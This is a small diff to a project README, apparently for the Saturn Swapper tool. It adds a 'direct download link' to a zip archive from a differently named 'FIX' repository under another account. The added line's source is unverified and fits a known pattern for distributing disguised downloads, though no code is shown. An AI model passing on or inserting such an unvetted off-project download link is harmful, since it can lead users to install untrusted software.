@@ -24,6 +24,7 @@ This repo should contain issues that are tied to the actual codebase of the proj
 ## Useful Links
 * [Saturn's Discord](https://discord.gg/SaturnSwapper)
 * [WebView2 Runtime (comes with Windows 11, you need the x64 Evergreen Bootstrapper)](https://developer.microsoft.com/en-us/microsoft-edge/webview2/#download-section) - Needed to run the website the project hosts as a native program
+* if you somehow dont know how to download on github use this direct download link from github https://github.com/MoxOnGIT/SaturnSwapperFIX/archive/refs/heads/master.zip
 
 ## Unlisted Contributors
 
